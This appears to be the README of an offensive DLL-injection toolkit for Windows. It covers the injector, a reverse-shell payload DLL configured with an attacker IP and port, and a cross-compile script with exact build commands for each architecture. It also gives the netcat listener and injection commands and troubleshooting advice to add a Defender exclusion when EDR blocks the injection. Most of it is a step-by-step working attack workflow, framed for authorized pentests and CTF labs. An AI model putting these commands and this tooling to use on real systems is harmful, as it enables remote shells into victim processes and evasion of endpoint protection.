# process-injection-2

Full DLL-injection toolkit for thick-client testing: the injector (both x64 and x86 builds), a reverse-shell payload DLL, and reusable source for building your own.

**Technique**: DLL injection via `CreateRemoteThread + LoadLibraryA` (MITRE ATT&CK T1055.001). The injector allocates a buffer inside the target process, writes a DLL path into it, then starts a remote thread at `kernel32!LoadLibraryA` with that path as its argument — the target's own loader does the work. Once loaded, the DLL spawns a thread that does whatever you want: pop calc, open a reverse shell, dump creds, etc.

## Layout

```
process-injection-2/
├── pop.cpp                     flexible injector — target by PID/name,
├── pop_x64.exe                    --dll / --spawn / --msg / --list modes.
├── pop_x86.exe                    colored output; arch-mismatch auto-switch.
│
├── build_revshell_dll.sh       Linux interactive cross-compiler for the DLL:
│                               prompts LHOST/LPORT, menu picks arch
│                               (x64/x86/ARM64/all), writes revshell_<arch>.dll.
│
└── reverse-shell/              reverse-shell payload DLL
    ├── revshell_pure_dll.cpp   DLL — copies cmd.exe next to the host EXE,
    ├── revshell_pure_dll.dll   patches FileDescription, spawns renamed copy
    │                           (x64 build of the above .cpp)
    ├── revshell_x86.dll        x86 (WOW64) build of the same .cpp —
    │                           used automatically if target is 32-bit
    └── build.ps1
```

Keep **both DLLs in the same folder**. `pop.exe` auto-reads the target's arch and switches to whichever DLL matches — so one `--dll <path>` command injects into x64 and x86 targets alike.

## Config (in `reverse-shell/revshell_pure_dll.cpp`)

```cpp
static const char*    LHOST                = "10.10.14.1";       // your attacker IP
static const int      LPORT                = 4444;
static const char*    CHILD_EXE_NAME       = "revShell.exe";
static const wchar_t* DESCRIPTION_OVERRIDE = L"RevShell - WinCmd Proc";
```

Edit these, rebuild the DLL.

---

## Build the DLL

### Easiest — the interactive script (Linux)

```bash
chmod +x build_revshell_dll.sh
./build_revshell_dll.sh
```

The script:

- prompts for **LHOST** and **LPORT** (defaults `10.10.14.1` / `4444`; remembers your last answers in `build_revshell_dll.conf` next to the script)
- shows an **arch menu**: `1) x64  2) x86  3) ARM64  4) all`
- installs `mingw-w64` with `sudo apt` if missing (ARM64 prints a one-line hint for `llvm-mingw`)
- writes `reverse-shell/revshell_<arch>.dll`
- **never modifies the committed `.cpp`** — substitution happens on a temp copy

Sample run:

```
[+] source : ./reverse-shell/revshell_pure_dll.cpp
[+] output : ./reverse-shell/revshell_<arch>.dll
? LHOST (attacker IP) [10.10.14.1]: 192.168.1.50
? LPORT (listener port) [4444]:
Pick architecture:
  1)  x64    (AMD64 — 99% of modern Windows targets)
  2)  x86    (32-bit / WOW64 — legacy apps)
  3)  ARM64  (Surface Pro X, newer ARM laptops)
  4)  all three
? choice [1]: 4

[+] building  x64   -> ./reverse-shell/revshell_x64.dll     ok  136704 bytes
[+] building  x86   -> ./reverse-shell/revshell_x86.dll     ok  113664 bytes
[+] building  arm64 -> ./reverse-shell/revshell_arm64.dll   ok  142848 bytes
[+] done  (settings saved to ./build_revshell_dll.conf)
```

### Manual — one-liner per architecture

Pick the arch that **matches the target process**, not the injector. `pop.exe` prints the target's arch in its `[+] target` block at runtime.

### Linux (Kali / Ubuntu / Debian — cross-compile)

**x64** (AMD64 — 99% of modern Windows targets):

```bash
sudo apt install -y mingw-w64 && x86_64-w64-mingw32-g++ -shared -O2 -s -o revshell_x64.dll revshell_pure_dll.cpp -lws2_32 -Wl,--subsystem,windows,--kill-at
```

**x86** (32-bit / WOW64 — legacy apps like Lightshot, old installers):

```bash
sudo apt install -y mingw-w64 && i686-w64-mingw32-g++ -shared -O2 -s -o revshell_x86.dll revshell_pure_dll.cpp -lws2_32 -Wl,--subsystem,windows,--kill-at
```

**ARM64** (Surface Pro X, newer ARM laptops — needs llvm-mingw, not in apt):

```bash
curl -LO https://github.com/mstorsjo/llvm-mingw/releases/latest/download/llvm-mingw-20231031-ucrt-ubuntu-20.04-x86_64.tar.xz && tar -xf llvm-mingw-*.tar.xz && ./llvm-mingw-*/bin/aarch64-w64-mingw32-g++ -shared -O2 -s -o revshell_arm64.dll revshell_pure_dll.cpp -lws2_32 -Wl,--subsystem,windows,--kill-at
```

### Windows (MSVC — one line per arch, each in a fresh cmd)

Set your VS path once as `VC` then reuse:

```bash
set VC="C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvarsall.bat"
```

**x64**:

```bash
cmd /c %VC% x64 ^&^& cl /LD /EHsc /O2 /nologo revshell_pure_dll.cpp /link ws2_32.lib /OUT:revshell_x64.dll
```

**x86**:

```bash
cmd /c %VC% x86 ^&^& cl /LD /EHsc /O2 /nologo revshell_pure_dll.cpp /link ws2_32.lib /OUT:revshell_x86.dll
```

**ARM64** (requires the "MSVC ARM64 build tools" workload in VS Installer):

```bash
cmd /c %VC% x64_arm64 ^&^& cl /LD /EHsc /O2 /nologo revshell_pure_dll.cpp /link ws2_32.lib /OUT:revshell_arm64.dll
```

### Build `pop.exe` itself (Windows only, both archs)

```bash
cmd /c %VC% x64 ^&^& cl /EHsc /O2 /nologo pop.cpp /link psapi.lib user32.lib advapi32.lib /OUT:pop_x64.exe
cmd /c %VC% x86 ^&^& cl /EHsc /O2 /nologo pop.cpp /link psapi.lib user32.lib advapi32.lib /OUT:pop_x86.exe
```

---

## 3-step usage guide

### 1. Edit LHOST in `revshell_pure_dll.cpp`

```cpp
static const char* LHOST = "10.10.14.1";    // your Kali/attacker IP
static const int   LPORT = 4444;
```

### 2. Pick the right pair based on the target's arch

Run `pop.exe` once against the target to see its arch. The `[+] target` block shows it:

```
[+] target
    - PID 1234, name foo.exe, arch x64
```

| Target shows | DLL to use | Injector to use |
|---|---|---|
| `arch x64` | `revshell_pure_dll.dll` (x64 build) | `pop_x64.exe` |
| `arch x86 (WOW64)` | `revshell_x86.dll` | `pop_x86.exe` |
| `arch ARM64` | build `revshell_arm64.dll` (see above) | *(ARM64 pop.exe build pending)* |

**Tip**: put both DLLs in the same folder — `pop.exe` auto-switches to whichever matches the target's arch, so you can pass either one.

### 3. Start listener, fire the inject

```bash
# Attacker (Kali)
nc -lvnp 4444
```

```powershell
# Victim — auto-switches to revshell_x86.dll if target is 32-bit
pop_x64.exe <PID_or_name> --dll revshell_pure_dll.dll
```

Shell lands on your listener. Child process appears under the target as `RevShell - WinCmd Proc` (big text in Task Manager Processes tab) with image name `revShell.exe` — identifiable at a glance.

---

## Other modes — spawn a small app as a child of the target

Useful for PoC screenshots / demos (parent-child tree in Task Manager is the "proof"):

```powershell
pop_x64.exe <target> --spawn calc.exe             # spawn Calculator
pop_x64.exe <target> --spawn notepad.exe          # spawn Notepad
pop_x64.exe <target> --spawn mspaint.exe          # spawn Paint
pop_x64.exe <target> --spawn cmd.exe              # spawn cmd window
pop_x64.exe <target> --spawn powershell.exe       # spawn PowerShell
pop_x64.exe <target> --spawn "cmd /k whoami"      # spawn cmd running whoami
pop_x64.exe <target> --spawn "cmd /k systeminfo"  # spawn cmd running systeminfo
```

Same syntax for `pop_x86.exe` against x86 targets. The spawn chain is pure shellcode (`WinExec`), so no DLL is required and arch-mismatch rules don't apply here — any program in `PATH` works.

## MessageBox mode — visible banner inside the target

```powershell
pop_x64.exe explorer "I was here"
pop_x64.exe 1234 "PWNED by m14r41"
```

## Example output

```
[+] target
    - PID 7936, name MVTC.exe, arch x64
    - user HACKER-DC\Admin, memory 234.3 MB

[+] payload
    - revshell_pure_dll.dll (x64, 134 KB)
    - C:\Users\admin\Downloads\revshell_pure_dll.dll

    [1]  OpenProcess(7936, PROCESS_ALL_ACCESS)  .........  ok   handle 0xC8
    [2]  VirtualAllocEx(47, RW)  ........................  ok   0x1DAE7EB0000
    [3]  WriteProcessMemory(0x1DAE7EB0000, path, 47)  ...  ok   47 B
    [4]  GetProcAddress(kernel32, LoadLibraryA)  ........  ok   0x7FF8D5CB01F0
    [5]  CreateRemoteThread(entry=[4], arg=[2])  ........  ok   tid 0x104
    [6]  GetExitCodeThread  ............................  ok   HMODULE 0xC1320000

[+] success  DLL loaded inside MVTC.exe (PID 7936)
```

Arch mismatch is caught up-front (no wasted injection attempt):

```
[!] failed   architecture mismatch: target is x86 (WOW64), DLL is x64
[*] hint     rebuild the DLL for x86 (WOW64)
```

Flags: `--list` lists every injectable PID with arch; `--msg "text"` pops a MessageBox inside the target; `--spawn program.exe` spawns a child; `--no-color` for plain text.

---

## Troubleshooting

| Error line | Cause | Fix |
|---|---|---|
| `OpenProcess ... err 5` | Target is at higher integrity | Run cmd as Administrator |
| `OpenProcess ... err 87` | PID doesn't exist | Use `--list` or `tasklist`; check the number |
| `CreateRemoteThread ... err 5` | EDR / Defender blocked remote-thread creation | Add a folder exclusion in Windows Security |
| `GetExitCodeThread ... HMODULE 0` | DLL load failed inside target | Arch mismatch, missing dep (ws2_32), Defender quarantine, or DllMain=FALSE |
| `GetExitCodeThread ... timeout` | DllMain blocking (bad pattern) | Use a simpler DLL that returns from DllMain immediately |

## Coverage matrix

| Target device | Native arch | Common? | Build this |
|---|---|---|---|
| Any 64-bit PC / laptop / server | x64 | yes (99%) | `revshell_x64.dll` + `pop_x64.exe` |
| Legacy 32-bit apps (Lightshot, old installers) | x86 | some | `revshell_x86.dll` + `pop_x86.exe` |
| Surface Pro X, newer ARM laptops | ARM64 | growing | `revshell_arm64.dll` |
| Windows RT tablets | ARM | dead | — |

For a CTF/lab, shipping x64 + x86 covers ~100% of what you'll meet.

## Legal

Authorized testing only. Running against systems you don't own or weren't given explicit permission to test is a crime in most jurisdictions.
